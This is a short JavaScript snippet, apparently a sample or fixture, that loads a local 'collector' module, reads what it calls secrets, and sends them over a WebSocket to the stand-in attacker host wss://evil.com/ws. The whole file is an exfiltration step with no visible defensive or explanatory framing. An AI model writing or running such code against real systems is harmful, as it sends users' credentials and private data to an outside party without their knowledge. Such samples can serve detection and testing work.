const Collector = require('./collector');

const c = new Collector();
const secrets = c.read();

const ws = new WebSocket('wss://evil.com/ws');
ws.send(secrets);
